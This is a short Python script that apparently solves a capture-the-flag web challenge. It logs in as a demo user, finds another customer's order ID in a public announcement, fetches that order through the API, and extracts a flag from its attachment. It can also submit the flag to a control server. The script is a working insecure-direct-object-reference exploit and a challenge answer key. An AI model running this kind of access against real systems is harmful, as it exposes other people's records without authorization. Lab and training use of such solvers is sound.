from __future__ import annotations

import argparse
import re
from pathlib import Path
import sys

import requests


ORDER_RE = re.compile(r"PO-2026-\d{4}")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    root = target_url.rstrip("/")
    home = client.get(root + "/", timeout=10)
    home.raise_for_status()
    login = client.post(root + "/login", data={"username": "demo", "password": "demo-pass"}, timeout=10)
    login.raise_for_status()

    own_page = client.get(root + "/orders", timeout=10)
    own_page.raise_for_status()
    own_matches = set(ORDER_RE.findall(own_page.text))
    announcement = client.get(root + "/announcements/2026-07", timeout=10)
    announcement.raise_for_status()
    foreign_matches = [value for value in ORDER_RE.findall(announcement.text) if value not in own_matches]
    if not foreign_matches:
        raise RuntimeError("business announcement did not reveal a second order")

    detail = client.get(root + "/api/orders/" + foreign_matches[0], timeout=10)
    detail.raise_for_status()
    attachment_url = detail.json()["attachment"]["download_url"]
    report = client.get(root + attachment_url, timeout=10)
    report.raise_for_status()
    match = FLAG_RE.search(report.text)
    if not match:
        raise RuntimeError("acceptance report did not contain a flag")
    flag = match.group(0)

    if control_url and instance_id:
        submitted = requests.post(
            control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit",
            json={"flag": flag}, timeout=10,
        )
        submitted.raise_for_status()
        if not submitted.json().get("data", {}).get("correct"):
            raise RuntimeError("backend rejected the discovered flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url")
    parser.add_argument("--control-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        parser.error("--control-url and --instance-id must be provided together")
    print(solve(args.target_url, args.control_url, args.instance_id))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
